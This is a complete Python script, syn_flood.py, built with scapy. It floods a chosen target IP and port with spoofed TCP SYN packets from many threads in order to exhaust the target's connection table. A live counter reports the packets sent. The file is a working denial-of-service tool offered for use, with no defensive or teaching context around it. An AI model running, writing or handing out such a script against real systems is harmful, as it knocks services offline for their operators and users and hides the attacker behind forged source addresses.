# language: Python 3, file: syn_flood.py, target: Linux (requires scapy + root)
# SYN flood — sends spoofed TCP SYN packets to exhaust target connection table.
from scapy.all import IP, TCP, RandIP, RandShort, send
import threading

stop_event = threading.Event()
sent = [0]
lock = threading.Lock()

def flood(target_ip, target_port):
    while not stop_event.is_set():
        pkt = IP(src=RandIP(), dst=target_ip) / TCP(
            sport=RandShort(), dport=target_port,
            flags='S', seq=1000
        )
        send(pkt, verbose=False)
        with lock:
            sent[0] += 1

def printer():
    import time
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            print(f'\r[+] Packets sent: {sent[0]}', end='', flush=True)

def main():
    target_ip = input('Target IP: ').strip()
    target_port = int(input('Target port (ex: 80): ').strip())
    thread_count = int(input('Threads (ex: 100): ').strip())
    print(f'[*] SYN flood -> {target_ip}:{target_port} | {thread_count} threads')
    print('[*] Ctrl+C to stop')
    threads = []
    t_print = threading.Thread(target=printer, daemon=True)
    t_print.start()
    for _ in range(thread_count):
        t = threading.Thread(target=flood, args=(target_ip, target_port), daemon=True)
        t.start()
        threads.append(t)
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print('\n[!] Stopping...')
        stop_event.set()
    print(f'\n[+] Total packets: {sent[0]}')

if __name__ == '__main__':
    main()
